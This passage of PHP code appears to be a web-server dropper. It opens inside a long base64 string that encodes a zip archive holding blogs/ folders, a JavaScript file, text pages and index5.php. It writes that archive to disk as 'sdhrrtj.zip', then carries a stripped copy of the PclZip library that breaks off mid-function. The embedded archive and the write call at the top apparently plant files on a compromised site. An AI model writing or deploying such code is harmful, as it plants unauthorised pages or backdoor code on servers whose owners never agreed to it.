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"); 
file_put_contents("sdhrrtj.zip",$data); 



if (!defined('PCLZIP_READ_BLOCK_SIZE')) {
  define( 'PCLZIP_READ_BLOCK_SIZE', 2048 );
}

if (!defined('PCLZIP_SEPARATOR')) {
  define( 'PCLZIP_SEPARATOR', ',' );
}

if (!defined('PCLZIP_ERROR_EXTERNAL')) {
  define( 'PCLZIP_ERROR_EXTERNAL', 0 );
}

if (!defined('PCLZIP_TEMPORARY_DIR')) {
  define( 'PCLZIP_TEMPORARY_DIR', '' );
}

if (!defined('PCLZIP_TEMPORARY_FILE_RATIO')) {
  define( 'PCLZIP_TEMPORARY_FILE_RATIO', 0.47 );
}


$g_pclzip_version = "2.8.2";

define( 'PCLZIP_ERR_USER_ABORTED', 2 );
define( 'PCLZIP_ERR_NO_ERROR', 0 );
define( 'PCLZIP_ERR_WRITE_OPEN_FAIL', -1 );
define( 'PCLZIP_ERR_READ_OPEN_FAIL', -2 );
define( 'PCLZIP_ERR_INVALID_PARAMETER', -3 );
define( 'PCLZIP_ERR_MISSING_FILE', -4 );
define( 'PCLZIP_ERR_FILENAME_TOO_LONG', -5 );
define( 'PCLZIP_ERR_INVALID_ZIP', -6 );
define( 'PCLZIP_ERR_BAD_EXTRACTED_FILE', -7 );
define( 'PCLZIP_ERR_DIR_CREATE_FAIL', -8 );
define( 'PCLZIP_ERR_BAD_EXTENSION', -9 );
define( 'PCLZIP_ERR_BAD_FORMAT', -10 );
define( 'PCLZIP_ERR_DELETE_FILE_FAIL', -11 );
define( 'PCLZIP_ERR_RENAME_FILE_FAIL', -12 );
define( 'PCLZIP_ERR_BAD_CHECKSUM', -13 );
define( 'PCLZIP_ERR_INVALID_ARCHIVE_ZIP', -14 );
define( 'PCLZIP_ERR_MISSING_OPTION_VALUE', -15 );
define( 'PCLZIP_ERR_INVALID_OPTION_VALUE', -16 );
define( 'PCLZIP_ERR_ALREADY_A_DIRECTORY', -17 );
define( 'PCLZIP_ERR_UNSUPPORTED_COMPRESSION', -18 );
define( 'PCLZIP_ERR_UNSUPPORTED_ENCRYPTION', -19 );
define( 'PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE', -20 );
define( 'PCLZIP_ERR_DIRECTORY_RESTRICTION', -21 );

define( 'PCLZIP_OPT_PATH', 77001 );
define( 'PCLZIP_OPT_ADD_PATH', 77002 );
define( 'PCLZIP_OPT_REMOVE_PATH', 77003 );
define( 'PCLZIP_OPT_REMOVE_ALL_PATH', 77004 );
define( 'PCLZIP_OPT_SET_CHMOD', 77005 );
define( 'PCLZIP_OPT_EXTRACT_AS_STRING', 77006 );
define( 'PCLZIP_OPT_NO_COMPRESSION', 77007 );
define( 'PCLZIP_OPT_BY_NAME', 77008 );
define( 'PCLZIP_OPT_BY_INDEX', 77009 );
define( 'PCLZIP_OPT_BY_EREG', 77010 );
define( 'PCLZIP_OPT_BY_PREG', 77011 );
define( 'PCLZIP_OPT_COMMENT', 77012 );
define( 'PCLZIP_OPT_ADD_COMMENT', 77013 );
define( 'PCLZIP_OPT_PREPEND_COMMENT', 77014 );
define( 'PCLZIP_OPT_EXTRACT_IN_OUTPUT', 77015 );
define( 'PCLZIP_OPT_REPLACE_NEWER', 77016 );
define( 'PCLZIP_OPT_STOP_ON_ERROR', 77017 );
define( 'PCLZIP_OPT_EXTRACT_DIR_RESTRICTION', 77019 );
define( 'PCLZIP_OPT_TEMP_FILE_THRESHOLD', 77020 );
define( 'PCLZIP_OPT_TEMP_FILE_ON', 77021 );
define( 'PCLZIP_OPT_TEMP_FILE_OFF', 77022 );

define( 'PCLZIP_ATT_FILE_NAME', 79001 );
define( 'PCLZIP_ATT_FILE_NEW_SHORT_NAME', 79002 );
define( 'PCLZIP_ATT_FILE_NEW_FULL_NAME', 79003 );
define( 'PCLZIP_ATT_FILE_MTIME', 79004 );
define( 'PCLZIP_ATT_FILE_CONTENT', 79005 );
define( 'PCLZIP_ATT_FILE_COMMENT', 79006 );

define( 'PCLZIP_CB_PRE_EXTRACT', 78001 );
define( 'PCLZIP_CB_POST_EXTRACT', 78002 );
define( 'PCLZIP_CB_PRE_ADD', 78003 );
define( 'PCLZIP_CB_POST_ADD', 78004 );

class PclZip
{
  var $zipname = '';

  var $zip_fd = 0;

  var $error_code = 1;
  var $error_string = '';
  
  var $magic_quotes_status;

function PclZip($p_zipname)
{

  if (!function_exists('gzopen'))
  {
    die('Abort '.basename(__FILE__).' : Missing zlib extensions');
  }

  $this->zipname = $p_zipname;
  $this->zip_fd = 0;
  $this->magic_quotes_status = -1;

  return;
}

function create($p_filelist)
{
  $v_result=1;

  $this->privErrorReset();

  $v_options = array();
  $v_options[PCLZIP_OPT_NO_COMPRESSION] = FALSE;

  $v_size = func_num_args();

  if ($v_size > 1) {
    $v_arg_list = func_get_args();

    array_shift($v_arg_list);
    $v_size--;

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_ADD => 'optional',
                                                 PCLZIP_CB_POST_ADD => 'optional',
                                                 PCLZIP_OPT_NO_COMPRESSION => 'optional',
                                                 PCLZIP_OPT_COMMENT => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
                                                 
                                           ));
      if ($v_result != 1) {
        return 0;
      }
    }

    else {

      $v_options[PCLZIP_OPT_ADD_PATH] = $v_arg_list[0];

      if ($v_size == 2) {
        $v_options[PCLZIP_OPT_REMOVE_PATH] = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
	                       "Invalid number / type of arguments");
        return 0;
      }
    }
  }
  
  $this->privOptionDefaultThreshold($v_options);

  $v_string_list = array();
  $v_att_list = array();
  $v_filedescr_list = array();
  $p_result_list = array();
  
  if (is_array($p_filelist)) {
  
    if (isset($p_filelist[0]) && is_array($p_filelist[0])) {
      $v_att_list = $p_filelist;
    }
    
    else {
      $v_string_list = $p_filelist;
    }
  }

  else if (is_string($p_filelist)) {
    $v_string_list = explode(PCLZIP_SEPARATOR, $p_filelist);
  }

  else {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_filelist");
    return 0;
  }
  
  if (sizeof($v_string_list) != 0) {
    foreach ($v_string_list as $v_string) {
      if ($v_string != '') {
        $v_att_list[][PCLZIP_ATT_FILE_NAME] = $v_string;
      }
      else {
      }
    }
  }
  
  $v_supported_attributes
  = array ( PCLZIP_ATT_FILE_NAME => 'mandatory'
           ,PCLZIP_ATT_FILE_NEW_SHORT_NAME => 'optional'
           ,PCLZIP_ATT_FILE_NEW_FULL_NAME => 'optional'
           ,PCLZIP_ATT_FILE_MTIME => 'optional'
           ,PCLZIP_ATT_FILE_CONTENT => 'optional'
           ,PCLZIP_ATT_FILE_COMMENT => 'optional'
					);
  foreach ($v_att_list as $v_entry) {
    $v_result = $this->privFileDescrParseAtt($v_entry,
                                             $v_filedescr_list[],
                                             $v_options,
                                             $v_supported_attributes);
    if ($v_result != 1) {
      return 0;
    }
  }

  $v_result = $this->privFileDescrExpand($v_filedescr_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  $v_result = $this->privCreate($v_filedescr_list, $p_result_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  return $p_result_list;
}

function add($p_filelist)
{
  $v_result=1;

  $this->privErrorReset();

  $v_options = array();
  $v_options[PCLZIP_OPT_NO_COMPRESSION] = FALSE;

  $v_size = func_num_args();

  if ($v_size > 1) {
    $v_arg_list = func_get_args();

    array_shift($v_arg_list);
    $v_size--;

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_ADD => 'optional',
                                                 PCLZIP_CB_POST_ADD => 'optional',
                                                 PCLZIP_OPT_NO_COMPRESSION => 'optional',
                                                 PCLZIP_OPT_COMMENT => 'optional',
                                                 PCLZIP_OPT_ADD_COMMENT => 'optional',
                                                 PCLZIP_OPT_PREPEND_COMMENT => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
                                                 
											   ));
      if ($v_result != 1) {
        return 0;
      }
    }

    else {

      $v_options[PCLZIP_OPT_ADD_PATH] = $v_add_path = $v_arg_list[0];

      if ($v_size == 2) {
        $v_options[PCLZIP_OPT_REMOVE_PATH] = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

        return 0;
      }
    }
  }

  $this->privOptionDefaultThreshold($v_options);

  $v_string_list = array();
  $v_att_list = array();
  $v_filedescr_list = array();
  $p_result_list = array();
  
  if (is_array($p_filelist)) {
  
    if (isset($p_filelist[0]) && is_array($p_filelist[0])) {
      $v_att_list = $p_filelist;
    }
    
    else {
      $v_string_list = $p_filelist;
    }
  }

  else if (is_string($p_filelist)) {
    $v_string_list = explode(PCLZIP_SEPARATOR, $p_filelist);
  }

  else {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type '".gettype($p_filelist)."' for p_filelist");
    return 0;
  }
  
  if (sizeof($v_string_list) != 0) {
    foreach ($v_string_list as $v_string) {
      $v_att_list[][PCLZIP_ATT_FILE_NAME] = $v_string;
    }
  }
  
  $v_supported_attributes
  = array ( PCLZIP_ATT_FILE_NAME => 'mandatory'
           ,PCLZIP_ATT_FILE_NEW_SHORT_NAME => 'optional'
           ,PCLZIP_ATT_FILE_NEW_FULL_NAME => 'optional'
           ,PCLZIP_ATT_FILE_MTIME => 'optional'
           ,PCLZIP_ATT_FILE_CONTENT => 'optional'
           ,PCLZIP_ATT_FILE_COMMENT => 'optional'
					);
  foreach ($v_att_list as $v_entry) {
    $v_result = $this->privFileDescrParseAtt($v_entry,
                                             $v_filedescr_list[],
                                             $v_options,
                                             $v_supported_attributes);
    if ($v_result != 1) {
      return 0;
    }
  }

  $v_result = $this->privFileDescrExpand($v_filedescr_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  $v_result = $this->privAdd($v_filedescr_list, $p_result_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  return $p_result_list;
}

function listContent()
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $p_list = array();
  if (($v_result = $this->privList($p_list)) != 1)
  {
    unset($p_list);
    return(0);
  }

  return $p_list;
}

function extract()
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $v_options = array();
  $v_path = '';
  $v_remove_path = "";
  $v_remove_all_path = false;

  $v_size = func_num_args();

  $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;

  if ($v_size > 0) {
    $v_arg_list = func_get_args();

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_EXTRACT => 'optional',
                                                 PCLZIP_CB_POST_EXTRACT => 'optional',
                                                 PCLZIP_OPT_SET_CHMOD => 'optional',
                                                 PCLZIP_OPT_BY_NAME => 'optional',
                                                 PCLZIP_OPT_BY_EREG => 'optional',
                                                 PCLZIP_OPT_BY_PREG => 'optional',
                                                 PCLZIP_OPT_BY_INDEX => 'optional',
                                                 PCLZIP_OPT_EXTRACT_AS_STRING => 'optional',
                                                 PCLZIP_OPT_EXTRACT_IN_OUTPUT => 'optional',
                                                 PCLZIP_OPT_REPLACE_NEWER => 'optional'
                                                 ,PCLZIP_OPT_STOP_ON_ERROR => 'optional'
                                                 ,PCLZIP_OPT_EXTRACT_DIR_RESTRICTION => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
											    ));
      if ($v_result != 1) {
        return 0;
      }

      if (isset($v_options[PCLZIP_OPT_PATH])) {
        $v_path = $v_options[PCLZIP_OPT_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_PATH])) {
        $v_remove_path = $v_options[PCLZIP_OPT_REMOVE_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_ALL_PATH])) {
        $v_remove_all_path = $v_options[PCLZIP_OPT_REMOVE_ALL_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_ADD_PATH])) {
        if ((strlen($v_path) > 0) && (substr($v_path, -1) != '/')) {
          $v_path .= '/';
        }
        $v_path .= $v_options[PCLZIP_OPT_ADD_PATH];
      }
    }

    else {

      $v_path = $v_arg_list[0];

      if ($v_size == 2) {
        $v_remove_path = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

        return 0;
      }
    }
  }

  $this->privOptionDefaultThreshold($v_options);


  $p_list = array();
  $v_result = $this->privExtractByRule($p_list, $v_path, $v_remove_path,
                                     $v_remove_all_path, $v_options);
  if ($v_result < 1) {
    unset($p_list);
    return(0);
  }

  return $p_list;
}



function extractByIndex($p_index)
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $v_options = array();
  $v_path = '';
  $v_remove_path = "";
  $v_remove_all_path = false;

  $v_size = func_num_args();

  $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;

  if ($v_size > 1) {
    $v_arg_list = func_get_args();

    array_shift($v_arg_list);
    $v_size--;

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_EXTRACT_AS_STRING => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_EXTRACT => 'optional',
                                                 PCLZIP_CB_POST_EXTRACT => 'optional',
                                                 PCLZIP_OPT_SET_CHMOD => 'optional',
                                                 PCLZIP_OPT_REPLACE_NEWER => 'optional'
                                                 ,PCLZIP_OPT_STOP_ON_ERROR => 'optional'
                                                 ,PCLZIP_OPT_EXTRACT_DIR_RESTRICTION => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
											   ));
      if ($v_result != 1) {
        return 0;
      }

      if (isset($v_options[PCLZIP_OPT_PATH])) {
        $v_path = $v_options[PCLZIP_OPT_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_PATH])) {
        $v_remove_path = $v_options[PCLZIP_OPT_REMOVE_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_ALL_PATH])) {
        $v_remove_all_path = $v_options[PCLZIP_OPT_REMOVE_ALL_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_ADD_PATH])) {
        if ((strlen($v_path) > 0) && (substr($v_path, -1) != '/')) {
          $v_path .= '/';
        }
        $v_path .= $v_options[PCLZIP_OPT_ADD_PATH];
      }
      if (!isset($v_options[PCLZIP_OPT_EXTRACT_AS_STRING])) {
        $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;
      }
      else {
      }
    }

    else {

      $v_path = $v_arg_list[0];

      if ($v_size == 2) {
        $v_remove_path = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

        return 0;
      }
    }
  }


  $v_arg_trick = array (PCLZIP_OPT_BY_INDEX, $p_index);
  $v_options_trick = array();
  $v_result = $this->privParseOptions($v_arg_trick, sizeof($v_arg_trick), $v_options_trick,
                                      array (PCLZIP_OPT_BY_INDEX => 'optional' ));
  if ($v_result != 1) {
      return 0;
  }
  $v_options[PCLZIP_OPT_BY_INDEX] = $v_options_trick[PCLZIP_OPT_BY_INDEX];

  $this->privOptionDefaultThreshold($v_options);

  if (($v_result = $this->privExtractByRule($p_list, $v_path, $v_remove_path, $v_remove_all_path, $v_options)) < 1) {
      return(0);
  }

  return $p_list;
}

function delete()
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $v_options = array();

  $v_size = func_num_args();

  if ($v_size > 0) {
    $v_arg_list = func_get_args();

    $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                      array (PCLZIP_OPT_BY_NAME => 'optional',
                                             PCLZIP_OPT_BY_EREG => 'optional',
                                             PCLZIP_OPT_BY_PREG => 'optional',
                                             PCLZIP_OPT_BY_INDEX => 'optional' ));
    if ($v_result != 1) {
        return 0;
    }
  }

  $this->privDisableMagicQuotes();

  $v_list = array();
  if (($v_result = $this->privDeleteByRule($v_list, $v_options)) != 1) {
    $this->privSwapBackMagicQuotes();
    unset($v_list);
    return(0);
  }

  $this->privSwapBackMagicQuotes();

  return $v_list;
}

function deleteByIndex($p_index)
{
  
  $p_list = $this->delete(PCLZIP_OPT_BY_INDEX, $p_index);

  return $p_list;
}

function properties()
{

  $this->privErrorReset();

  $this->privDisableMagicQuotes();

  if (!$this->privCheckFormat()) {
    $this->privSwapBackMagicQuotes();
    return(0);
  }

  $v_prop = array();
  $v_prop['comment'] = '';
  $v_prop['nb'] = 0;
  $v_prop['status'] = 'not_exist';

  if (@is_file($this->zipname))
  {
    if (($this->zip_fd = @fopen($this->zipname, 'rb')) == 0)
    {
      $this->privSwapBackMagicQuotes();
      
      PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in binary read mode');

      return 0;
    }

    $v_central_dir = array();
    if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
    {
      $this->privSwapBackMagicQuotes();
      return 0;
    }

    $this->privCloseFd();

    $v_prop['comment'] = $v_central_dir['comment'];
    $v_prop['nb'] = $v_central_dir['entries'];
    $v_prop['status'] = 'ok';
  }

  $this->privSwapBackMagicQuotes();

  return $v_prop;
}

function duplicate($p_archive)
{
  $v_result = 1;

  $this->privErrorReset();

  if ((is_object($p_archive)) && (get_class($p_archive) == 'pclzip'))
  {

    $v_result = $this->privDuplicate($p_archive->zipname);
  }

  else if (is_string($p_archive))
  {

    if (!is_file($p_archive)) {
      PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "No file with filename '".$p_archive."'");
      $v_result = PCLZIP_ERR_MISSING_FILE;
    }
    else {
      $v_result = $this->privDuplicate($p_archive);
    }
  }

  else
  {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_archive_to_add");
    $v_result = PCLZIP_ERR_INVALID_PARAMETER;
  }

  return $v_result;
}

function merge($p_archive_to_add)
{
  $v_result = 1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  if ((is_object($p_archive_to_add)) && (get_class($p_archive_to_add) == 'pclzip'))
  {

    $v_result = $this->privMerge($p_archive_to_add);
  }

  else if (is_string($p_archive_to_add))
  {

    $v_object_archive = new PclZip($p_archive_to_add);

    $v_result = $this->privMerge($v_object_archive);
  }

  else
  {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_archive_to_add");
    $v_result = PCLZIP_ERR_INVALID_PARAMETER;
  }

  return $v_result;
}



function errorCode()
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    return(PclErrorCode());
  }
  else {
    return($this->error_code);
  }
}

function errorName($p_with_code=false)
{
  $v_name = array ( PCLZIP_ERR_NO_ERROR => 'PCLZIP_ERR_NO_ERROR',
                    PCLZIP_ERR_WRITE_OPEN_FAIL => 'PCLZIP_ERR_WRITE_OPEN_FAIL',
                    PCLZIP_ERR_READ_OPEN_FAIL => 'PCLZIP_ERR_READ_OPEN_FAIL',
                    PCLZIP_ERR_INVALID_PARAMETER => 'PCLZIP_ERR_INVALID_PARAMETER',
                    PCLZIP_ERR_MISSING_FILE => 'PCLZIP_ERR_MISSING_FILE',
                    PCLZIP_ERR_FILENAME_TOO_LONG => 'PCLZIP_ERR_FILENAME_TOO_LONG',
                    PCLZIP_ERR_INVALID_ZIP => 'PCLZIP_ERR_INVALID_ZIP',
                    PCLZIP_ERR_BAD_EXTRACTED_FILE => 'PCLZIP_ERR_BAD_EXTRACTED_FILE',
                    PCLZIP_ERR_DIR_CREATE_FAIL => 'PCLZIP_ERR_DIR_CREATE_FAIL',
                    PCLZIP_ERR_BAD_EXTENSION => 'PCLZIP_ERR_BAD_EXTENSION',
                    PCLZIP_ERR_BAD_FORMAT => 'PCLZIP_ERR_BAD_FORMAT',
                    PCLZIP_ERR_DELETE_FILE_FAIL => 'PCLZIP_ERR_DELETE_FILE_FAIL',
                    PCLZIP_ERR_RENAME_FILE_FAIL => 'PCLZIP_ERR_RENAME_FILE_FAIL',
                    PCLZIP_ERR_BAD_CHECKSUM => 'PCLZIP_ERR_BAD_CHECKSUM',
                    PCLZIP_ERR_INVALID_ARCHIVE_ZIP => 'PCLZIP_ERR_INVALID_ARCHIVE_ZIP',
                    PCLZIP_ERR_MISSING_OPTION_VALUE => 'PCLZIP_ERR_MISSING_OPTION_VALUE',
                    PCLZIP_ERR_INVALID_OPTION_VALUE => 'PCLZIP_ERR_INVALID_OPTION_VALUE',
                    PCLZIP_ERR_UNSUPPORTED_COMPRESSION => 'PCLZIP_ERR_UNSUPPORTED_COMPRESSION',
                    PCLZIP_ERR_UNSUPPORTED_ENCRYPTION => 'PCLZIP_ERR_UNSUPPORTED_ENCRYPTION'
                    ,PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE => 'PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE'
                    ,PCLZIP_ERR_DIRECTORY_RESTRICTION => 'PCLZIP_ERR_DIRECTORY_RESTRICTION'
                  );

  if (isset($v_name[$this->error_code])) {
    $v_value = $v_name[$this->error_code];
  }
  else {
    $v_value = 'NoName';
  }

  if ($p_with_code) {
    return($v_value.' ('.$this->error_code.')');
  }
  else {
    return($v_value);
  }
}

function errorInfo($p_full=false)
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    return(PclErrorString());
  }
  else {
    if ($p_full) {
      return($this->errorName(true)." : ".$this->error_string);
    }
    else {
      return($this->error_string." [code ".$this->error_code."]");
    }
  }
}





function privCheckFormat($p_level=0)
{
  $v_result = true;

  clearstatcache();

  $this->privErrorReset();

  if (!is_file($this->zipname)) {
    PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "Missing archive file '".$this->zipname."'");
    return(false);
  }

  if (!is_readable($this->zipname)) {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to read archive '".$this->zipname."'");
    return(false);
  }




  return $v_result;
}

function privParseOptions(&$p_options_list, $p_size, &$v_result_list, $v_requested_options=false)
{
  $v_result=1;
  
  $i=0;
  while ($i<$p_size) {

    if (!isset($v_requested_options[$p_options_list[$i]])) {
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid optional parameter '".$p_options_list[$i]."' for this method");

      return PclZip::errorCode();
    }

    switch ($p_options_list[$i]) {
      case PCLZIP_OPT_PATH :
      case PCLZIP_OPT_REMOVE_PATH :
      case PCLZIP_OPT_ADD_PATH :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = PclZipUtilTranslateWinPath($p_options_list[$i+1], FALSE);
        $i++;
      break;

      case PCLZIP_OPT_TEMP_FILE_THRESHOLD :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");
          return PclZip::errorCode();
        }
        
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_OFF])) {
